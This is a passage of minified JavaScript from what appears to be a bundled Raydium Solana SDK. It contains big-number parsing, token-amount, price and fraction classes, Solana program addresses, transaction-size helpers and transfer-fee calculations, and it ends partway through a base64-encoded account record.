      }
      if ("string" !== r) throw Error(ZA + t);
      return (
        45 === (n = t.charCodeAt(0))
          ? ((t = t.slice(1)), (o.s = -1))
          : (43 === n && (t = t.slice(1)), (o.s = 1)),
        rk.test(t)
          ? Tk(o, t)
          : (function (t, e) {
              var n, r, o, i, s, a, u, c, l;
              if (e.indexOf("_") > -1) {
                if (((e = e.replace(/(\d)_(?=\d)/g, "$1")), rk.test(e)))
                  return Tk(t, e);
              } else if ("Infinity" === e || "NaN" === e)
                return +e || (t.s = NaN), (t.e = NaN), (t.d = null), t;
              if (ek.test(e)) (n = 16), (e = e.toLowerCase());
              else if (tk.test(e)) n = 2;
              else {
                if (!nk.test(e)) throw Error(ZA + e);
                n = 8;
              }
              for (
                (i = e.search(/p/i)) > 0
                  ? ((u = +e.slice(i + 1)), (e = e.substring(2, i)))
                  : (e = e.slice(2)),
                  s = (i = e.indexOf(".")) >= 0,
                  r = t.constructor,
                  s &&
                    ((i = (a = (e = e.replace(".", "")).length) - i),
                    (o = vk(r, new r(n), i, 2 * i))),
                  i = l = (c = dk(e, n, ok)).length - 1;
                0 === c[i];
                --i
              )
                c.pop();
              return i < 0
                ? new r(0 * t.s)
                : ((t.e = mk(c, l)),
                  (t.d = c),
                  (VA = !1),
                  s && (t = fk(t, o, 4 * a)),
                  u &&
                    (t = t.times(Math.abs(u) < 54 ? $A(2, u) : wI.pow(2, u))),
                  (VA = !0),
                  t);
            })(o, t)
      );
    }
    if (
      ((i.prototype = ak),
      (i.ROUND_UP = 0),
      (i.ROUND_DOWN = 1),
      (i.ROUND_CEIL = 2),
      (i.ROUND_FLOOR = 3),
      (i.ROUND_HALF_UP = 4),
      (i.ROUND_HALF_DOWN = 5),
      (i.ROUND_HALF_EVEN = 6),
      (i.ROUND_HALF_CEIL = 7),
      (i.ROUND_HALF_FLOOR = 8),
      (i.EUCLID = 9),
      (i.config = i.set = jk),
      (i.clone = t),
      (i.isDecimal = Yk),
      (i.abs = Ok),
      (i.acos = Rk),
      (i.acosh = Mk),
      (i.add = Lk),
      (i.asin = Nk),
      (i.asinh = Dk),
      (i.atan = Uk),
      (i.atanh = qk),
      (i.atan2 = zk),
      (i.cbrt = Kk),
      (i.ceil = Wk),
      (i.clamp = Fk),
      (i.cos = Gk),
      (i.cosh = Vk),
      (i.div = Hk),
      (i.exp = Zk),
      (i.floor = Xk),
      (i.hypot = Jk),
      (i.ln = Qk),
      (i.log = $k),
      (i.log10 = eI),
      (i.log2 = tI),
      (i.max = nI),
      (i.min = rI),
      (i.mod = oI),
      (i.mul = iI),
      (i.pow = sI),
      (i.random = aI),
      (i.round = uI),
      (i.sign = cI),
      (i.sin = lI),
      (i.sinh = dI),
      (i.sqrt = fI),
      (i.sub = hI),
      (i.sum = pI),
      (i.tan = mI),
      (i.tanh = gI),
      (i.trunc = yI),
      void 0 === e && (e = {}),
      e && !0 !== e.defaults)
    )
      for (
        o = [
          "precision",
          "rounding",
          "toExpNeg",
          "toExpPos",
          "maxE",
          "minE",
          "modulo",
          "crypto",
        ],
          n = 0;
        n < o.length;

      )
        e.hasOwnProperty((r = o[n++])) || (e[r] = this[r]);
    return i.config(e), i;
  })(GA));
  (FA = new wI(FA)), (jA = new wI(jA));
  var bI = wI,
    vI = qv,
    AI = ((t) => (
      (t[(t.ROUND_DOWN = 0)] = "ROUND_DOWN"),
      (t[(t.ROUND_HALF_UP = 1)] = "ROUND_HALF_UP"),
      (t[(t.ROUND_UP = 2)] = "ROUND_UP"),
      t
    ))(AI || {}),
    kI = 9007199254740991;
  function II(t) {
    let e = PA("Raydium_parseBigNumberish");
    if (t instanceof Yn) return t;
    if ("string" == typeof t) {
      if (t.match(/^-?[0-9]+$/)) return new Yn(t);
      e.logWithError(`invalid BigNumberish string: ${t}`);
    }
    return "number" == typeof t
      ? (t % 1 && e.logWithError(`BigNumberish number underflow: ${t}`),
        (t >= kI || t <= -kI) &&
          e.logWithError(`BigNumberish number overflow: ${t}`),
        new Yn(String(t)))
      : "bigint" == typeof t
      ? new Yn(t.toString())
      : (e.error(`invalid BigNumberish value: ${t}`), new Yn(0));
  }
  var SI = PA("module/fraction"),
    _I = vI(Nv),
    TI = vI(mA),
    BI = { 0: TI.ROUND_DOWN, 1: TI.ROUND_HALF_UP, 2: TI.ROUND_UP },
    CI = { 0: Nv.roundDown, 1: Nv.roundHalfUp, 2: Nv.roundUp },
    EI = class {
      constructor(t, e = new Yn(1)) {
        (this.numerator = II(t)), (this.denominator = II(e));
      }
      get quotient() {
        return this.numerator.div(this.denominator);
      }
      invert() {
        return new EI(this.denominator, this.numerator);
      }
      add(t) {
        let e = t instanceof EI ? t : new EI(II(t));
        return this.denominator.eq(e.denominator)
          ? new EI(this.numerator.add(e.numerator), this.denominator)
          : new EI(
              this.numerator
                .mul(e.denominator)
                .add(e.numerator.mul(this.denominator)),
              this.denominator.mul(e.denominator)
            );
      }
      sub(t) {
        let e = t instanceof EI ? t : new EI(II(t));
        return this.denominator.eq(e.denominator)
          ? new EI(this.numerator.sub(e.numerator), this.denominator)
          : new EI(
              this.numerator
                .mul(e.denominator)
                .sub(e.numerator.mul(this.denominator)),
              this.denominator.mul(e.denominator)
            );
      }
      mul(t) {
        let e = t instanceof EI ? t : new EI(II(t));
        return new EI(
          this.numerator.mul(e.numerator),
          this.denominator.mul(e.denominator)
        );
      }
      div(t) {
        let e = t instanceof EI ? t : new EI(II(t));
        return new EI(
          this.numerator.mul(e.denominator),
          this.denominator.mul(e.numerator)
        );
      }
      toSignificant(t, e = { groupSeparator: "" }, n = 1) {
        Number.isInteger(t) || SI.logWithError(`${t} is not an integer.`),
          t <= 0 && SI.logWithError(`${t} is not positive.`),
          TI.set({ precision: t + 1, rounding: BI[n] });
        let r = new TI(this.numerator.toString())
          .div(this.denominator.toString())
          .toSignificantDigits(t);
        return r.toFormat(r.decimalPlaces(), e);
      }
      toFixed(t, e = { groupSeparator: "" }, n = 1) {
        return (
          Number.isInteger(t) || SI.logWithError(`${t} is not an integer.`),
          t < 0 && SI.logWithError(`${t} is negative.`),
          (_I.DP = t),
          (_I.RM = CI[n] || 1),
          new _I(this.numerator.toString())
            .div(this.denominator.toString())
            .toFormat(t, e)
        );
      }
      isZero() {
        return this.numerator.isZero();
      }
    },
    xI = PA("Raydium_amount"),
    PI = vI(Nv);
  var OI = class extends EI {
      constructor(t, e, n = !0, r) {
        let o = new Yn(0),
          i = oS.pow(new Yn(t.decimals));
        if (n) o = II(e);
        else {
          let n = new Yn(0),
            r = new Yn(0);
          if (
            "string" == typeof e ||
            "number" == typeof e ||
            "bigint" == typeof e
          ) {
            let [o, i] = (function (t, e) {
              let n = "0",
                r = "0";
              if (t.includes(".")) {
                let o = t.split(".");
                2 === o.length
                  ? (([n, r] = o), (r = r.padEnd(e, "0")))
                  : xI.logWithError(`invalid number string, num: ${t}`);
              } else n = t;
              return [n, r.slice(0, e) || r];
            })(e.toString(), t.decimals);
            (n = II(o)), (r = II(i));
          }
          (n = n.mul(i)), (o = n.add(r));
        }
        super(o, i), (this.logger = PA(r || "TokenAmount")), (this.token = t);
      }
      get raw() {
        return this.numerator;
      }
      isZero() {
        return this.raw.isZero();
      }
      gt(t) {
        return (
          this.token.equals(t.token) ||
            this.logger.logWithError("gt token not equals"),
          this.raw.gt(t.raw)
        );
      }
      lt(t) {
        return (
          this.token.equals(t.token) ||
            this.logger.logWithError("lt token not equals"),
          this.raw.lt(t.raw)
        );
      }
      add(t) {
        return (
          this.token.equals(t.token) ||
            this.logger.logWithError("add token not equals"),
          new OI(this.token, this.raw.add(t.raw))
        );
      }
      subtract(t) {
        return (
          this.token.equals(t.token) ||
            this.logger.logWithError("sub token not equals"),
          new OI(this.token, this.raw.sub(t.raw))
        );
      }
      toSignificant(t = this.token.decimals, e, n = 0) {
        return super.toSignificant(t, e, n);
      }
      toFixed(t = this.token.decimals, e, n = 0) {
        return (
          t > this.token.decimals &&
            this.logger.logWithError("decimals overflow"),
          super.toFixed(t, e, n)
        );
      }
      toExact(t = { groupSeparator: "" }) {
        return (
          (PI.DP = this.token.decimals),
          new PI(this.numerator.toString())
            .div(this.denominator.toString())
            .toFormat(t)
        );
      }
    },
    RI = {
      chainId: 101,
      address: Ji.default.toBase58(),
      programId: Bc.toBase58(),
      decimals: 9,
      symbol: "SOL",
      name: "solana",
      logoURI:
        "https://img-v1.raydium.io/icon/So11111111111111111111111111111111111111112.png",
      tags: [],
      priority: 2,
      type: "raydium",
      extensions: { coingeckoId: "solana" },
    },
    MI = {
      chainId: 101,
      address: "So11111111111111111111111111111111111111112",
      programId: Bc.toBase58(),
      decimals: 9,
      symbol: "WSOL",
      name: "Wrapped SOL",
      logoURI:
        "https://img-v1.raydium.io/icon/So11111111111111111111111111111111111111112.png",
      tags: [],
      priority: 2,
      type: "raydium",
      extensions: { coingeckoId: "solana" },
    };
  function LI({ pubkey: t, isSigner: e = !1, isWritable: n = !0 }) {
    return { pubkey: t, isWritable: n, isSigner: e };
  }
  var NI = [
    LI({ pubkey: Bc, isWritable: !1 }),
    LI({ pubkey: Gs.programId, isWritable: !1 }),
    LI({ pubkey: Cs, isWritable: !1 }),
  ];
  function DI({ publicKey: t, transformSol: e }) {
    let n = UI(t.toString());
    if (n instanceof Ji) return e && n.equals(VI) ? GI : n;
    if (e && n.toString() === VI.toBase58()) return GI;
    if ("string" == typeof n) {
      if (n === Ji.default.toBase58()) return Ji.default;
      try {
        return new Ji(n);
      } catch {
        throw new Error("invalid public key");
      }
    }
    throw new Error("invalid public key");
  }
  function UI(t) {
    try {
      return new Ji(t);
    } catch {
      return t;
    }
  }
  var qI = new Ji("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"),
    zI = new Ji("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"),
    KI = new Ji("SysvarRent111111111111111111111111111111111"),
    WI = new Ji("SysvarC1ock11111111111111111111111111111111"),
    FI = new Ji("metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s");
  new Ji("Sysvar1nstructions1111111111111111111111111");
  var jI = Gs.programId;
  new Ji("4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R"),
    new Ji("Ea5SjE2Y6yvCeW5dYTn7PYMuW5ikXkvbGdcmSnXeaLjS"),
    new Ji("SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt"),
    new Ji("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"),
    new Ji("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"),
    new Ji("mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So"),
    new Ji("7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj"),
    new Ji("USDH1SM1ojwWUga67PGrgFWUHibbjqMvuMaDkRJTgkX"),
    new Ji("NRVwhjBQiUPYtfDT5zRBVJajzFQHaBUNtC7SNVvqRFa"),
    new Ji("ANAxByE6G2WjFp7A4NqtWYXb3mgruyzZYg3spfxe6Lbo"),
    new Ji("7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs");
  var GI = new Ji("So11111111111111111111111111111111111111112"),
    VI = Ji.default;
  function HI(t) {
    return DI({ publicKey: t, transformSol: !0 });
  }
  var ZI = class {
      constructor({
        mint: t,
        decimals: e,
        symbol: n,
        name: r,
        skipMint: o = !1,
        isToken2022: i = !1,
      }) {
        if (t === VI.toBase58() || (t instanceof Ji && VI.equals(t)))
          return (
            (this.decimals = MI.decimals),
            (this.symbol = MI.symbol),
            (this.name = MI.name),
            (this.mint = new Ji(MI.address)),
            (this.isToken2022 = !1),
            void 0
          );
        (this.decimals = e),
          (this.symbol = n || t.toString().substring(0, 6)),
          (this.name = r || t.toString().substring(0, 6)),
          (this.mint = o ? Ji.default : DI({ publicKey: t })),
          (this.isToken2022 = i);
      }
      equals(t) {
        return this === t || this.mint.equals(t.mint);
      }
    },
    XI = ZI;
  XI.WSOL = new ZI(_A(SA({}, MI), { mint: MI.address }));
  var JI = class {
    constructor({ decimals: t, symbol: e = "UNKNOWN", name: n = "UNKNOWN" }) {
      (this.decimals = t), (this.symbol = e), (this.name = n);
    }
    equals(t) {
      return this === t;
    }
  };
  JI.SOL = new JI(RI);
  var YI = new EI(new Yn(100)),
    QI = class extends EI {
      toSignificant(t = 5, e, n) {
        return this.mul(YI).toSignificant(t, e, n);
      }
      toFixed(t = 2, e, n) {
        return this.mul(YI).toFixed(t, e, n);
      }
    },
    $I = PA("Raydium_price"),
    tS = class extends EI {
      constructor(t) {
        let { baseToken: e, quoteToken: n, numerator: r, denominator: o } = t;
        super(r, o),
          (this.baseToken = e),
          (this.quoteToken = n),
          (this.scalar = new EI(iS(e.decimals), iS(n.decimals)));
      }
      get raw() {
        return new EI(this.numerator, this.denominator);
      }
      get adjusted() {
        return super.mul(this.scalar);
      }
      invert() {
        return new tS({
          baseToken: this.quoteToken,
          quoteToken: this.baseToken,
          denominator: this.numerator,
          numerator: this.denominator,
        });
      }
      mul(t) {
        this.quoteToken !== t.baseToken &&
          $I.logWithError("mul token not equals");
        let e = super.mul(t);
        return new tS({
          baseToken: this.baseToken,
          quoteToken: t.quoteToken,
          denominator: e.denominator,
          numerator: e.numerator,
        });
      }
      toSignificant(t = this.quoteToken.decimals, e, n) {
        return this.adjusted.toSignificant(t, e, n);
      }
      toFixed(t = this.quoteToken.decimals, e, n) {
        return this.adjusted.toFixed(t, e, n);
      }
    };
  function eS(t) {
    return "string" == typeof t
      ? UI(t)
      : Array.isArray(t)
      ? t.map((t) => eS(t))
      : (function (t) {
          return (
            "object" == typeof t &&
            null !== t &&
            ![XI, OI, Ji, EI, Yn, tS, QI].some(
              (e) => "object" == typeof e && t instanceof e
            )
          );
        })(t)
      ? Object.fromEntries(Object.entries(t).map(([t, e]) => [t, eS(e)]))
      : t;
  }
  var nS = new Yn(0),
    rS = new Yn(1);
  new Yn(2), new Yn(3), new Yn(5);
  var oS = new Yn(10);
  function iS(t) {
    return oS.pow(II(t));
  }
  function sS(t, e) {
    let n = t.divmod(e);
    return n.mod.isZero()
      ? n.div
      : n.div.isNeg()
      ? n.div.isubn(1)
      : n.div.iaddn(1);
  }
  function aS(t, e, n) {
    return t.mul(e).add(n).sub(new Yn(1)).div(n);
  }
  function uS(t, e, n) {
    return t.mul(e).div(n);
  }
  function cS(t, e = 1, n = []) {
    let r = [...t];
    if (e <= 0) return n;
    for (; r.length; ) n.push(r.splice(0, e));
    return n;
  }
  new Yn(100), new Yn(1e3), new Yn(1e4);
  var lS,
    dS = class {
      constructor(t) {
        this._owner = t;
      }
      get publicKey() {
        return dS.isKeyPair(this._owner) ? this._owner.publicKey : this._owner;
      }
      get signer() {
        return dS.isKeyPair(this._owner) ? this._owner : void 0;
      }
      get isKeyPair() {
        return dS.isKeyPair(this._owner);
      }
      get isPublicKey() {
        return dS.isPublicKey(this._owner);
      }
      static isKeyPair(t) {
        return void 0 !== t.secretKey;
      }
      static isPublicKey(t) {
        return !dS.isKeyPair(t);
      }
    },
    fS =
      (((lS = fS || {})[(lS.V0 = 0)] = "V0"),
      (lS[(lS.LEGACY = 1)] = "LEGACY"),
      lS),
    hS = "CreateAccount",
    pS = "InitAccount",
    mS = "CreateATA",
    gS = "CloseAccount",
    yS = "TransferAmount",
    wS = "InitMarket",
    bS = "SetComputeUnitPrice",
    vS = "SetComputeUnitLimit",
    AS = "ClmmCreatePool",
    kS = "ClmmOpenPosition",
    IS = "ClmmIncreasePosition",
    SS = "ClmmDecreasePosition",
    _S = "ClmmClosePosition",
    TS = "ClmmSwapBaseIn",
    BS = "ClmmSwapBaseOut",
    CS = "ClmmInitReward",
    ES = "ClmmSetReward",
    xS = "ClmmCollectReward",
    PS = "ClmmLockPosition",
    OS = "ClmmHarvestLockPosition",
    RS = "AmmV4AddLiquidity",
    MS = "AmmV4RemoveLiquidity",
    LS = "AmmV4SwapBaseIn",
    NS = "AmmV4CreatePool",
    DS = "AmmV5AddLiquidity",
    US = "AmmV5RemoveLiquidity",
    qS = "AmmV5SwapBaseIn",
    zS = "RouteSwap",
    KS = "FarmV3Deposit",
    WS = "FarmV3Withdraw",
    FS = "FarmV3CreateLedger",
    jS = "FarmV4Withdraw",
    GS = "FarmV5Deposit",
    VS = "FarmV5Withdraw",
    HS = "FarmV6Deposit",
    ZS = "FarmV6Withdraw",
    XS = "FarmV6Create",
    JS = "FarmV6Restart",
    YS = "FarmV6CreatorAddReward",
    QS = "FarmV6CreatorWithdraw",
    $S = "CpmmCreatePool",
    t_ = "CpmmAddLiquidity",
    e_ = "CpmmWithdrawLiquidity",
    n_ = "CpmmSwapBaseIn",
    r_ = "CpmmSwapBaseOut",
    o_ = "CpmmLockLp",
    i_ = "CpmmCollectLockFee",
    s_ = "TransferTip",
    a_ = PA("Raydium_txUtil");
  function u_(t) {
    let e = [],
      n = [];
    return (
      t.microLamports &&
        (e.push($u.setComputeUnitPrice({ microLamports: t.microLamports })),
        n.push(bS)),
      t.units &&
        (e.push($u.setComputeUnitLimit({ units: t.units })), n.push(vS)),
      { instructions: e, instructionTypes: n }
    );
  }
  async function c_(t, e) {
    var n, r;
    let o = null != e ? e : "confirmed";
    return null ==
      (r = await (null == (n = t.getLatestBlockhash)
        ? void 0
        : n.call(t, { commitment: o })))
      ? void 0
      : r.blockhash;
  }
  async function l_(t, e) {
    return (
      t.getSignatureStatuses([e]),
      new Promise((n, r) => {
        let o = setTimeout(r, 6e4);
        t.onSignature(
          e,
          (t) => {
            if ((clearTimeout(o), !t.err)) return n(""), void 0;
            r(Object.assign(t.err, { txId: e }));
          },
          "confirmed"
        );
      })
    );
  }
  function d_(t, e) {
    t.length < 1 &&
      a_.logWithError(`no instructions provided: ${t.toString()}`),
      e.length < 1 && a_.logWithError(`no signers provided:, ${e.toString()}`);
    let n = new As();
    (n.recentBlockhash = "11111111111111111111111111111111"),
      (n.feePayer = e[0]),
      n.add(...t);
    try {
      return (
        dt.from(n.serialize({ verifySignatures: !1 })).toString("base64")
          .length < 1644
      );
    } catch {
      return !1;
    }
  }
  function f_(t, e) {
    let [n, r] = Ji.findProgramAddressSync(t, e);
    return { publicKey: n, nonce: r };
  }
  function h_({ instructions: t, payer: e, signers: n }) {
    return d_(t, [e, ...n]);
  }
  function p_({
    instructions: t,
    payer: e,
    lookupTableAddressAccount: n,
    recentBlockhash: r = Xu.generate().publicKey.toString(),
  }) {
    let o = new ks({
      payerKey: e,
      recentBlockhash: r,
      instructions: t,
    }).compileToV0Message(Object.values(null != n ? n : {}));
    try {
      return dt.from(new Is(o).serialize()).toString("base64").length < 1644;
    } catch {
      return !1;
    }
  }
  var m_ = (t) => {
    let e = t.serialize({ requireAllSignatures: !1, verifySignatures: !1 });
    t instanceof Is &&
      (e = ((t) =>
        dt.isBuffer(t)
          ? t
          : t instanceof Uint8Array
          ? dt.from(t.buffer, t.byteOffset, t.byteLength)
          : dt.from(t))(e));
    try {
      return e instanceof dt
        ? e.toString("base64")
        : dt.from(e).toString("base64");
    } catch {
      return e.toString("base64");
    }
  };
  function g_(t) {
    let e = [];
    return (
      t.forEach((t) => {
        t instanceof As &&
          (t.recentBlockhash || (t.recentBlockhash = Bc.toBase58()),
          t.feePayer || (t.feePayer = Xu.generate().publicKey)),
          e.push(m_(t));
      }),
      void 0,
      e
    );
  }
  function y_(t, e, n) {
    return f_(
      [t.toBuffer(), (null != n ? n : Bc).toBuffer(), e.toBuffer()],
      new Ji("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
    );
  }
  var w_ = new Ji("EhhTKczWMGQt46ynNeRX1WfeagwwJd7ufHvCDjRxjo5Q"),
    b_ = new Ji("CBuCnLe26faBpcBP2fktp4rp8abpcAnTWft6ZrP5Q4T"),
    v_ = new Ji("9KEPoZmtHUrBbhWN1v1KWLMkkvwY6WLtAVUCPRtRjP4z"),
    A_ = new Ji("FarmqiPv5eAj3j1GMdMCMUGXqPUvmquZtMy86QH6rzhG");
  new Ji("CLaimxFqjHzgTJtAGHU47NPhg6qrc5sCnpC4tBLyABQS");
  var k_ = new Ji("srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX"),
    I_ = new Ji("9xQeWvG816bUx9EPjHmaT23yvVM2ZWbrrpZb9PusVFin"),
    S_ = new Ji("675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8");
  new Ji("5quBtoiQqxF9Jv6KYKctB59NT3gtJD2Y65kdnB1Uev3h");
  var __ = new Ji("CDSr3ssLcRB6XYPJwAfFt18MZvEZp4LjHcvzBVZ45duo"),
    T_ = new Ji("CAMMCzo5YL8w4VFF8KVHrK22GGUsp5VTaW7grrKgrWqK"),
    B_ = new Ji("LockrWmn6K5twhz3y9w1dQERbmgSaRkfnTeTKbpofwE"),
    C_ = new Ji("kN1kEznaF5Xbd8LYuqtEFcxzWSBk5Fv6ygX6SqEGJVy");
  new Ji("routeUGWgWzqBWFcrCfv8tritsqukccJPu3q5GPP3xS");
  var E_ = new Ji("7YttLkHDoNj9wyDur5pM1ejNaAvT9X4eqaYcHQqtj2G5"),
    x_ = new Ji("6FJon3QE27qgPVggARueB22hLvoh22VzJpXv4rBEoSLF"),
    P_ = new Ji("CC12se5To1CdEuw7fDS27B7Geo5jJyL7t5UK2B44NgiH"),
    O_ = new Ji("9HzJyW1qZsEiSfMUf6L2jo3CcTKAyBmSyKdwQeYisHrC"),
    R_ = new Ji("DropEU8AvevN3UrXWXTMuz3rqnMczQVNjq3kcSdW2SQi"),
    M_ = new Ji("CPMMoo8L3F4NbTegBCKVNunggL7H1ZpdTHKxQB5qKP1C"),
    L_ = new Ji("GpMZbSM2GgvTKHJirzeGfMFoaZ8UR2X7F4v8vHTvxFbL");
  new Ji("DNXgeM9EiiaAbaWvwjHj9fQQLAX5ZsfHyvmYUNRAdNC8"),
    new Ji("CPMDWBwJDtYax9qW7AyRuVC19Cc4L4Vcy4n2BHAbHkCW"),
    new Ji("7rQ1QFNosMkUCuh7Z7fPbTHvh73b68sQYdirycEzJVuw"),
    new Ji("G11FKBRaAkHAKuLCgLM6K6NUc9rTjPAznRCjZifrTQe2");
  var N_ = new Ji("LockrWmn6K5twhz3y9w1dQERbmgSaRkfnTeTKbpofwE");
  new Ji("DLockwT7X7sxtLmGH9g5kmfcjaBtncdbUmi738m5bvQC");
  var D_ = new Ji("3f7GcQFG397GAaEnv51zR6tsTVihYRydnydDD1cXekxH");
  new Ji("7AFUeLVRjBfzqK3tTGw8hN48KLQWSk6DTE8xprWdPqix");
  var U_ = new Ji("LanMV9sAd7wArD4vJFi2qDdfnVhFxYSUg6eADduJ3uj");
  new Ji("WLHv2UAZm6z4KyaaELi5pjdbJh6RESMva1Rnn8pJVVh"),
    new Ji("LanD8FpTBBvzZFXjTxsAoipkFsxPUCDB4qAqKxYDiNP"),
    new Ji("HYNHiyKJ3gGVFvyxJAurK7qr7P2o5J9THmvCGMdULtpW");
  var q_ = {
    IDO_PROGRAM_ID_V1: x_,
    IDO_PROGRAM_ID_V2: P_,
    IDO_PROGRAM_ID_V3: O_,
    IDO_PROGRAM_ID_V4: R_,
  };
  ({
    SERUM_MARKET: Ji.default,
    OPENBOOK_MARKET: new Ji("EoTcMgcDRTJVZDMZWBoU6rhYHZfkNTVEAfz3uUJRcYGj"),
    UTIL1216: Ji.default,
    FarmV3: new Ji("85BFyr98MbCUU9MVTEgzx1nbhWACbJqLzho6zd6DZcWL"),
    FarmV5: new Ji("EcLzTrNg9V7qhcdyXDe2qjtPkiGzDM2UbdRaeaadU5r2"),
    FarmV6: new Ji("Farm2hJLcqPtPg8M4rR6DMrsRNc5TPm5Cs4bVQrMe2T7"),
    AmmV4: new Ji("HWy1jotHpo6UqeQxx49dpYYdQB8wj9Qk9MdxwjLvDHB8"),
    AmmStable: new Ji("DDg4VmQaJV9ogWce7LpcjBA9bv22wRp5uaTPa5pGjijF"),
    CLMM: new Ji("devi51mZmdwUJGU9hjN27vEz64Gps7uUefqxg27EAtH"),
    CLMM_LOCK_PROGRAM_ID: new Ji(
      "DLockwT7X7sxtLmGH9g5kmfcjaBtncdbUmi738m5bvQC"
    ),
    CLMM_LOCK_AUTH_ID: new Ji("8qmHNvu2Kr2C7U8mJL4Vz1vTDxMhVuXKREwU7TNoaVEo"),
    Router: new Ji("BVChZ3XFEwTMUk1o9i3HAf91H6mFxSwa5X2wFAWhYPhU"),
    FEE_DESTINATION_ID: new Ji("3XMrhbv989VxAMi3DErLV9eJht1pHppW5LbKxe9fkEFR"),
  });
  var z_ = 1e4;
  function K_(t, e, n, r) {
    if (void 0 === e) return { amount: t, fee: void 0, expirationTime: void 0 };
    let o = _A(SA({}, e), {
        olderTransferFee: {
          epoch: BigInt(e.olderTransferFee.epoch),
          maximumFee: BigInt(e.olderTransferFee.maximumFee),
          transferFeeBasisPoints: e.olderTransferFee.transferFeeBasisPoints,
        },
        newerTransferFee: {
          epoch: BigInt(e.newerTransferFee.epoch),
          maximumFee: BigInt(e.newerTransferFee.maximumFee),
          transferFeeBasisPoints: e.newerTransferFee.transferFeeBasisPoints,
        },
      }),
      i =
        n.epoch < o.newerTransferFee.epoch
          ? o.olderTransferFee
          : o.newerTransferFee,
      s = new Yn(i.maximumFee.toString()),
      a =
        n.epoch < o.newerTransferFee.epoch
          ? (400 *
              (Number(o.newerTransferFee.epoch) * n.slotsInEpoch -
                n.absoluteSlot)) /
            1e3
          : void 0;
    if (r) {
      if (i.transferFeeBasisPoints === z_) {
        let e = new Yn(i.maximumFee.toString());
        return { amount: t.add(e), fee: e, expirationTime: a };
      }
      {
        let e = F_(t.mul(new Yn(z_)), new Yn(z_ - i.transferFeeBasisPoints)),
          n = new Yn(i.maximumFee.toString()),
          r = e.sub(t).gt(n) ? t.add(n) : e,
          o = F_(r.mul(new Yn(i.transferFeeBasisPoints)), new Yn(z_));
        return { amount: r, fee: o.gt(s) ? s : o, expirationTime: a };
      }
    }
    {
      let e = F_(t.mul(new Yn(i.transferFeeBasisPoints)), new Yn(z_));
      return { amount: t, fee: e.gt(s) ? s : e, expirationTime: a };
    }
  }
  function W_(t, e) {
    return void 0 === t ? e : void 0 === e ? t : Math.min(t, e);
  }
  function F_(t, e) {
    let { div: n, mod: r } = t.divmod(e);
    return r.gt(new Yn(0)) ? n.add(new Yn(1)) : n;
  }
  function j_(t, e) {
    if (t.isZero()) return new Yn(0);
    let n = t.div(e);
    return n.isZero()
      ? new Yn(1)
      : t.mod(e).gt(new Yn(0))
      ? n.add(new Yn(1))
      : n;
  }
  async function G_({ connection: t, address: e }) {
    let n = await RA(
        t,
        [...new Set(e.map((t) => t.toString()))].map((t) => new Ji(t))
      ),
      r = {};
    for (let o = 0; o < e.length; o++) {
      let t = n[o],
        i = e[o];
      if (!t) continue;
      let s = new na({ key: i, state: na.deserialize(t.data) });
      (r[i.toString()] = s), (H_[i.toString()] = s);
    }
    return r;
  }
  var V_,
    H_ = {
      AcL1Vo8oy1ULiavEcjSUcwfBSForXMudcZvDZy5nzJkU: new na({
        key: new Ji("AcL1Vo8oy1ULiavEcjSUcwfBSForXMudcZvDZy5nzJkU"),
        state: na.deserialize(
          dt.from(
            "AQAAAP//////////I1rcEwAAAAAvAQYwun9CU6c5Ikm2pAj+D9IEnCOR45nK+SFTGSdpd6J6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbd9uHXZaGT2cvhRs7reawctIXtX1s3kTqM9YV+/wCpBt324e51j94YQl285GzN2rYa/E2DuQ0n/r35KNihi/wFSlNQ+F3IgtYUpVZyeIopbd8eq6vQpgZ4iEky9O72oAVKU1qZKSEGTSTocWDaOHx8NbXdvJK7geQfqEBBBUSNBqfVFxksXFEhjMlMPUrxf1ja7gibof1E49vZigAAAAAGp9UXGMd0yShWY5hpHV62i164o5tLbVxzVVshAAAAAIyXJY9OJInxuz0QKRSODYMLWhOZ2v8QhASOe9jb6fhZC3BlsePRfEU4nVJ/awTDzVi4bHMaoP21SbbRvAP4KUbIScv+6Yw2LHF/6K0ZjUPibbSWXCirYPGuuVl7zT789IUPLW4CpHr4JNCatp3ELXDLKMv6JJ+37le50lbBJ2LvBkX2T9y7AHdNGviJAqQNtlDUDCnauQRWybsLji6nPM8Qkw5asQRvCdB3MbX6IEBwytOrpM32l4jQygKG9TKgR0vZScQ2AsM/IHeQ7RajUkyhuZdc8SGiqQz/7H34torNR/Wir3sl0ruUrVxJWEZfUg+QLNAxxODdBi53/OP7Ioil1cqeBM9dtZC3FLov4yyxWRM/wcGStyJX/QfTnLBAHqkqWotPKVlShCVQqpP9W5W1rOao65IMk5QuQ2kMIOxzDMKAy2vjGSxQODgBz0QwGA+eP4ZjIjrIAQaXENv31QfLlOdXSRCkaybRniDHF4C8YcwhcvsqrOVuTP4B2Na+9wLdtrB31uz2rtlFI5kahdsnp/d1SrASDInYCtTYtdoke4kX+hoKWcEWM4Tle8pTUkUVv4BxS6fje/EzKBE4Qu/YsA/yfEEFGcr8Z57VKDw8uQzpiru7g4lvjnfapW62W030syevD8k07SGoxUHiuT/ai7gAHWWhDsVmg/C63ajgpkH7Sn3GdutArDTfyqOkdqv4/IPC/EFFy7mGkfDd2C57N5a/4jC+BbmJy7wQaSEZr0CQU88lPtUxIVvzGjC95b8Ooss2TqmkrayGKofkPMGQn7Ux+9lfwBSNfxwH8NgbpqC/7LNlV4I7nCvsXf3p+ohQk9NrAJb2KAFpUqEIJ9ZBV7BYDzHF/ORKYlgtvPnXjudZQ6CEo5OzUDaNIomTCCsvhD16TxJjsbgne1kGnQPCFSoaxUbq2